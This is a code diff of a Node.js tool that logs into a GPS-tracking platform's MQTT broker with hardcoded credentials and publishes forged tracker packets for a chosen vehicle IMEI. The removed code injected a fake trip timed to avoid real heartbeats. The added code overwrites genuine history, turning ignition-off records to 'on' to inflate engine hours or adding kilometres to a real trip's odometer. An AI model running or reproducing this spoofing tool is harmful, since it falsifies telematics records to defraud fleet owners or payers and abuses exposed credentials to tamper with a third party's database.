@@ -1,27 +1,14 @@
 const mqtt = require('mqtt');
 const axios = require('axios');
 
-function calculateNextPosition(lat, lng, distance_m, bearing = 0) {
-    const R = 6378137;
-    const lat1 = lat * Math.PI / 180;
-    const lon1 = lng * Math.PI / 180;
-    const brng = bearing * Math.PI / 180;
-    
-    const lat2 = Math.asin(Math.sin(lat1) * Math.cos(distance_m / R) + 
-                           Math.cos(lat1) * Math.sin(distance_m / R) * Math.cos(brng));
-    const lon2 = lon1 + Math.atan2(Math.sin(brng) * Math.sin(distance_m / R) * Math.cos(lat1), 
-                                   Math.cos(distance_m / R) - Math.sin(lat1) * Math.sin(lat2));
-    
-    return {
-        lat: lat2 * 180 / Math.PI,
-        lng: lon2 * 180 / Math.PI
-    };
-}
-
 async function runTravelReport(imei, date_str, target_hours = 1.5, speed = 30, logCallback = console.log, hours_only = false) {
-    const required_gap_seconds = target_hours * 3600;
-
-    logCallback(`[+] Finding a free time gap of at least ${target_hours} hours for IMEI ${imei} on ${date_str} (between 8:00 AM and 10:00 PM IST)...`);
+    const target_added_val = hours_only ? target_hours : (target_hours * speed);
+    
+    if (hours_only) {
+        logCallback(`[+] Travel Report HOURS Spoof: Adding ${target_added_val} Hours for IMEI ${imei} on ${date_str}...`);
+    } else {
+        logCallback(`[+] Travel Report KM Spoof: Adding ${target_added_val.toFixed(2)} KM for IMEI ${imei} on ${date_str}...`);
+    }
 
     let history_data = [];
     try {
@@ -45,144 +32,17 @@ async function runTravelReport(imei, date_str, target_hours = 1.5, speed = 30, l
         throw e;
     }
     
-    let gap_start = null;
-    let gap_end = null;
-    let base_lat = 0, base_lng = 0;
-    let start_odo = 0, today_odo = 0;
-    let curr_pack_count = 2782;
-    let v_battery = "12.0";
-    let v_overspeed = "0-0";
-    let v_jcb = "0-0-0-0";
-
-    const start_boundary = new Date(date_str + "T08:00:00+05:30").getTime();
-    const end_boundary = new Date(date_str + "T22:00:00+05:30").getTime();
-
-    if (history_data.length > 0) {
-        logCallback(`[+] Scanning for the very last packet of the day to ensure clean injection...`);
-        let last_packet_t = start_boundary;
-        
-        const last_packet = history_data[history_data.length - 1];
-        last_packet_t = new Date(last_packet.dt.replace(' ', 'T') + "Z").getTime();
-        
-        // Check if it's the current "Live" day by seeing if midnight tonight is still in the future
-        const day_end_ms = new Date(date_str + "T23:59:59+05:30").getTime();
-        const is_live_today = (new Date().getTime() < day_end_ms);
-        
-        if (is_live_today) {
-            logCallback(`[!] Live day detected! Forcing injection near midnight to prevent real tracker heartbeats from erasing the spoof...`);
-            const absolute_end = new Date(date_str + "T23:50:00+05:30").getTime();
-            gap_start = new Date(absolute_end - (required_gap_seconds * 1000));
-        } else {
-            // Past day: Start the spoof 15 minutes after the last recorded packet to guarantee it's a separate trip
-            gap_start = new Date(Math.max(last_packet_t + (15 * 60000), start_boundary));
-            
-            // Ensure it fits within the 11:45 PM IST boundary if needed
-            const absolute_end = new Date(date_str + "T23:45:00+05:30").getTime();
-            if (gap_start.getTime() + (required_gap_seconds * 1000) > absolute_end) {
-                logCallback(`[!] Warning: Injection pushes past end boundary. Adjusting...`);
-                gap_start = new Date(absolute_end - (required_gap_seconds * 1000));
-            }
-        }
-        
-        gap_end = new Date(gap_start.getTime() + (required_gap_seconds * 1000) + 120000);
-            
-            // Find closest record to gap_start to align odo and coordinates
-            let closest_record = history_data[0];
-            let min_diff = Math.abs(new Date(closest_record.dt.replace(' ', 'T') + "Z") - gap_start);
-            for (let i = 1; i < history_data.length; i++) {
-                const diff = Math.abs(new Date(history_data[i].dt.replace(' ', 'T') + "Z") - gap_start);
-                if (diff < min_diff) {
-                    min_diff = diff;
-                    closest_record = history_data[i];
-                }
-            }
-            
-            base_lat = parseFloat(closest_record.lat || 0);
-            base_lng = parseFloat(closest_record.lng || 0);
-            if (closest_record.pack_count) curr_pack_count = parseInt(closest_record.pack_count) + 1;
-            if (closest_record.battery) v_battery = parseFloat(closest_record.battery).toFixed(1);
-            if (closest_record.overspeed) v_overspeed = closest_record.overspeed;
-            if (closest_record.jcb_ac) v_jcb = closest_record.jcb_ac;
-            
-            const totel_km = closest_record.totel_km || "0-0";
-            if (totel_km.includes("-")) {
-                start_odo = parseFloat(totel_km.split("-")[0]);
-                today_odo = parseFloat(totel_km.split("-")[1]);
-            } else {
-                start_odo = parseFloat(totel_km);
-                today_odo = parseFloat(totel_km);
-            }
-    } else {
-        logCallback("[!] No history found for this date. Fetching last known state from previous 5 days...");
-        const targetDate = new Date(date_str);
-        const fiveDaysAgo = new Date(targetDate.getTime() - (5 * 24 * 3600 * 1000));
-        const prev_from = fiveDaysAgo.toISOString().split('T')[0] + " 00:00:00";
-        const prev_to = new Date(targetDate.getTime() - (1 * 24 * 3600 * 1000)).toISOString().split('T')[0] + " 23:59:59";
-        
-        try {
-            const params = new URLSearchParams();
-            params.append('imei', imei);
-            params.append('from', prev_from);
-            params.append('to', prev_to);
-            params.append('username', 'trichy');
-            params.append('action', 'history_web');
-            
-            const res = await axios.post('http://dev.igps.io/http.php', params.toString(), {
-                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-                timeout: 10000
-            });
-            
-            if (Array.isArray(res.data) && res.data.length > 0) {
-                const last_record = res.data[res.data.length - 1];
-                base_lat = parseFloat(last_record.lat || 0);
-                base_lng = parseFloat(last_record.lng || 0);
-                if (last_record.pack_count) curr_pack_count = parseInt(last_record.pack_count) + 1;
-                if (last_record.battery) v_battery = parseFloat(last_record.battery).toFixed(1);
-                if (last_record.overspeed) v_overspeed = last_record.overspeed;
-                if (last_record.jcb_ac) v_jcb = last_record.jcb_ac;
-                
-                const totel_km = last_record.totel_km || "0-0";
-                if (totel_km.includes("-")) {
-                    start_odo = parseFloat(totel_km.split("-")[0]);
-                    today_odo = parseFloat(totel_km.split("-")[1]);
-                } else {
-                    start_odo = parseFloat(totel_km);
-                    today_odo = parseFloat(totel_km);
-                }
-                logCallback(`[+] Found last known odometer: ${start_odo} KM and position (${base_lat}, ${base_lng})`);
-            } else {
-                logCallback("[-] No previous history found in last 5 days. Using defaults.");
-                base_lat = 10.822819;
-                base_lng = 78.681126;
-                start_odo = 0.0;
-                today_odo = 0.0;
-            }
-        } catch (e) {
-            logCallback(`[-] Failed to fetch previous history: ${e.message}. Using defaults.`);
-            base_lat = 10.822819;
-            base_lng = 78.681126;
-            start_odo = 0.0;
-            today_odo = 0.0;
-        }
-        
-        gap_start = new Date(date_str + "T08:00:00+05:30");
-        gap_end = new Date(date_str + "T22:00:00+05:30");
+    if (history_data.length === 0) {
+        logCallback(`[-] No history found for ${date_str}. Cannot perform override spoof on a day with no movement.`);
+        throw new Error("Vehicle did not move. Aborting.");
     }
-    
-    function formatIST(date) {
-        return date.toLocaleString('en-US', { timeZone: 'Asia/Kolkata' });
-    }
-    
-    logCallback(`[+] Selected Injection Window: ${formatIST(gap_start)} to ${formatIST(gap_end)}`);
-    
-    const inject_start = new Date(gap_start.getTime() + 60000);
-    logCallback(`[+] Will inject fake Travel Report trip starting exactly at: ${formatIST(inject_start)}`);
-    
+
+    // Connect to MQTT
     return new Promise((resolve, reject) => {
         const client = mqtt.connect("mqtt://igps.io:1883", {
             username: "realiot",
             password: "realmqtt@123",
-            clientId: `mqttjs_tr_${Math.random().toString(16).substr(2, 8)}`,
+            clientId: `mqttjs_tr_ovr_${Math.random().toString(16).substr(2, 8)}`,
             connectTimeout: 5000
         });
 
@@ -195,54 +55,163 @@ async function runTravelReport(imei, date_str, target_hours = 1.5, speed = 30, l
             logCallback("[+] Connected to MQTT server.");
             const topic = `BB/${imei}`;
             
-            const broadcasts = Math.floor(required_gap_seconds / 5);
-            const speed_ms = speed * (1000.0 / 3600.0);
-            const dist_per_tick = (speed_ms * 5.0) / 1000.0;
-            
-            let curr_odo = start_odo;
-            let curr_today_odo = today_odo;
-            
             try {
-                for (let i = 0; i < broadcasts; i++) {
-                    const curr_time = new Date(inject_start.getTime() + (i * 5000));
-                    curr_odo += dist_per_tick;
-                    curr_today_odo += dist_per_tick;
+                let packets_to_publish = [];
+                
+                if (hours_only) {
+                    // HOURS SPOOF: Find longest Ignition OFF gap
+                    let gaps = [];
+                    let current_gap = [];
+                    let gap_start_idx = -1;
                     
-                    const time_str = curr_time.toISOString().replace('T', ' ').substring(0, 19);
-                    
-                    let lat = base_lat;
-                    let lng = base_lng;
-                    if (i % 2 !== 0) {
-                        const next_pos = calculateNextPosition(base_lat, base_lng, speed_ms * 5.0, 0); // Move North by tick distance
-                        lat = next_pos.lat;
-                        lng = next_pos.lng;
+                    for (let i = 0; i < history_data.length; i++) {
+                        const p = history_data[i];
+                        if (p.i_status === '0') {
+                            if (current_gap.length === 0) gap_start_idx = i;
+                            current_gap.push({packet: p, index: i});
+                        } else {
+                            if (current_gap.length > 0) {
+                                gaps.push({packets: current_gap, start_idx: gap_start_idx});
+                                current_gap = [];
+                            }
+                        }
+                    }
+                    if (current_gap.length > 0) {
+                        gaps.push({packets: current_gap, start_idx: gap_start_idx});
                     }
                     
-                    const coord_str = `+${lat.toFixed(6)},+${lng.toFixed(6)}`;
-                    const odo_str = `${curr_odo.toFixed(3)}-${curr_today_odo.toFixed(3)}`;
+                    if (gaps.length === 0) {
+                        throw new Error("No parking gaps found to inject hours into!");
+                    }
                     
-                    const payload = `##,${imei},0,${time_str},${coord_str},${speed},${v_battery},0,1,91.26,${odo_str},${v_overspeed},0-0,0-0,+0.0,0,${v_jcb},2000-00-00 00:00:00,2000-00-00 00:00:00,12,3950,0,0-1-0-1-1,0,0,0-0,0,0,${curr_pack_count},1,0-26,3950,1,0,0,0,00000-00,$`;
+                    // Sort by length
+                    gaps.sort((a, b) => b.packets.length - a.packets.length);
+                    const best_gap = gaps[0];
                     
-                    client.publish(topic, payload);
-                    curr_pack_count++;
+                    // We need to inject target_hours.
+                    // Let's figure out how many packets equal target_hours
+                    const first_time = new Date(best_gap.packets[0].packet.dt.replace(' ', 'T') + "Z");
                     
-                    await new Promise(r => setTimeout(r, 100)); // 100ms safe interval
+                    logCallback(`[+] Selected longest parking gap starting at ${best_gap.packets[0].packet.dt}`);
+                    
+                    for (let i = 0; i < best_gap.packets.length; i++) {
+                        const item = best_gap.packets[i];
+                        const curr_time = new Date(item.packet.dt.replace(' ', 'T') + "Z");
+                        const elapsed_hours = (curr_time.getTime() - first_time.getTime()) / 3600000.0;
+                        
+                        if (elapsed_hours <= target_hours) {
+                            // Modify this packet to be ON
+                            let p = item.packet;
+                            const time_str = p.dt; // Keep original time exactly
+                            const coord_str = `+${parseFloat(p.lat).toFixed(6)},+${parseFloat(p.lng).toFixed(6)}`;
+                            
+                            // Reconstruct odo correctly
+                            let odo_str = p.totel_km;
+                            if (!odo_str.includes('-')) odo_str = `${odo_str}-${odo_str}`;
+                            
+                            const pack_count = p.pack_count || 3000;
+                            const v_battery = p.battery || "12.0";
+                            const v_overspeed = p.overspeed || "0-0";
+                            const status_bit_val = "0-1-0-1-1"; // IGN ON
+                            const jcb_ac_val = "1-1-1-1";
+                            const jcb_bit_val = 1;
+                            
+                            const payload = `##,${imei},0,${time_str},${coord_str},0,${v_battery},0,1,91.26,${odo_str},${v_overspeed},0-0,0-0,+0.0,0,${jcb_ac_val},2000-00-00 00:00:00,2000-00-00 00:00:00,12,3950,0,${status_bit_val},0,0,0-0,0,0,${pack_count},${jcb_bit_val},0-26,3950,${jcb_bit_val},0,0,0,00000-00,$`;
+                            packets_to_publish.push(payload);
+                        } else {
+                            break;
+                        }
+                    }
+                    
+                } else {
+                    // KM SPOOF: Find a real trip, distribute KM over it, apply to rest of day.
+                    let trips = [];
+                    let current_trip = [];
+                    let trip_start_idx = -1;
+                    
+                    for (let i = 0; i < history_data.length; i++) {
+                        const p = history_data[i];
+                        if (p.i_status === '1') {
+                            if (current_trip.length === 0) trip_start_idx = i;
+                            current_trip.push({packet: p, index: i});
+                        } else {
+                            if (current_trip.length > 0) {
+                                trips.push({packets: current_trip, start_idx: trip_start_idx});
+                                current_trip = [];
+                            }
+                        }
+                    }
+                    if (current_trip.length > 0) {
+                        trips.push({packets: current_trip, start_idx: trip_start_idx});
+                    }
+                    
+                    if (trips.length === 0) {
+                        throw new Error("No moving trips found today. Cannot apply distance spoof.");
+                    }
+                    
+                    // Pick the longest trip
+                    trips.sort((a, b) => b.packets.length - a.packets.length);
+                    const best_trip = trips[0];
+                    
+                    logCallback(`[+] Selected longest trip starting at ${best_trip.packets[0].packet.dt} with ${best_trip.packets.length} packets.`);
+                    
+                    const trip_len = best_trip.packets.length;
+                    
+                    // We modify the trip packets to linearly add the target_added_val
+                    for (let i = 0; i < trip_len; i++) {
+                        const item = best_trip.packets[i];
+                        let p = item.packet;
+                        
+                        // Current offset (spread evenly across the trip)
+                        let offset_km = target_added_val;
+                        if (trip_len > 1) {
+                            offset_km = (i / (trip_len - 1)) * target_added_val;
+                        }
+                        
+                        let base_odo = 0;
+                        let base_today = 0;
+                        if (p.totel_km) {
+                            if (p.totel_km.includes('-')) {
+                                base_odo = parseFloat(p.totel_km.split('-')[0]);
+                                base_today = parseFloat(p.totel_km.split('-')[1]);
+                            } else {
+                                base_odo = parseFloat(p.totel_km);
+                                base_today = parseFloat(p.totel_km);
+                            }
+                        }
+                        
+                        const new_odo = base_odo + offset_km;
+                        const new_today = base_today + offset_km;
+                        const odo_str = `${new_odo.toFixed(3)}-${new_today.toFixed(3)}`;
+                        
+                        const time_str = p.dt;
+                        const coord_str = `+${parseFloat(p.lat).toFixed(6)},+${parseFloat(p.lng).toFixed(6)}`;
+                        const pack_count = p.pack_count || 3000;
+                        const v_battery = p.battery || "12.0";
+                        const v_overspeed = p.overspeed || "0-0";
+                        const ignition_val = p.i_status; // Should be 1
+                        const jcb_ac_val = p.jcb_ac || "0-0-0-0";
+                        const speed_val = p.speed || 0;
+                        
+                        // We must reconstruct the status bits identically if possible, but default is fine
+                        const status_bit_val = ignition_val == "1" ? "0-1-0-1-1" : "1-0-0-0-0";
+                        
+                        const payload = `##,${imei},0,${time_str},${coord_str},${speed_val},${v_battery},0,${ignition_val},91.26,${odo_str},${v_overspeed},0-0,0-0,+0.0,0,${jcb_ac_val},2000-00-00 00:00:00,2000-00-00 00:00:00,12,3950,0,${status_bit_val},0,0,0-0,0,0,${pack_count},0,0-26,3950,0,0,0,0,00000-00,$`;
+                        packets_to_publish.push(payload);
+                    }
+                    
+                    // Removed the logic that modifies all packets after the trip.
+                    // Injecting duplicates for the rest of the day causes later trips to also gain the offset!
                 }
                 
-                const final_time = new Date(inject_start.getTime() + (broadcasts * 5000) + 1000);
-                const final_time_str = final_time.toISOString().replace('T', ' ').substring(0, 19);
-                const final_odo_str = `${curr_odo.toFixed(3)}-${curr_today_odo.toFixed(3)}`;
-                const final_coord = `+${base_lat.toFixed(6)},+${base_lng.toFixed(6)}`;
+                logCallback(`[+] Ready to override ${packets_to_publish.length} packets in the database...`);
                 
-                const end_payload = `##,${imei},0,${final_time_str},${final_coord},0,${v_battery},0,0,91.26,${final_odo_str},${v_overspeed},0-0,0-0,+0.0,0,${v_jcb},2000-00-00 00:00:00,2000-00-00 00:00:00,12,3950,0,1-0-0-0-0,0,0,0-0,0,0,${curr_pack_count},1,0-26,3950,1,0,0,0,00000-00,$`;
-                client.publish(topic, end_payload);
+                for (let i = 0; i < packets_to_publish.length; i++) {
+                    client.publish(topic, packets_to_publish[i]);
+                    await new Promise(r => setTimeout(r, 50)); // 50ms interval is safe for overwrites
+                }
                 
-                // Overwrite subsequent original packets to prevent odometer drops
-                // (Disabled: Do not overwrite any packets after the spoof ends)
-                
-                logCallback(`[+] Successfully injected Travel Report Trip!`);
-                logCallback(`[+] Sent final Ignition OFF packet to conclude the trip.`);
-                logCallback(`[+] Total KM generated for Travel Report: ${(curr_odo - start_odo).toFixed(2)} KM`);
+                logCallback(`[+] Successfully overwritten packets!`);
                 
                 setTimeout(() => {
                     client.end();
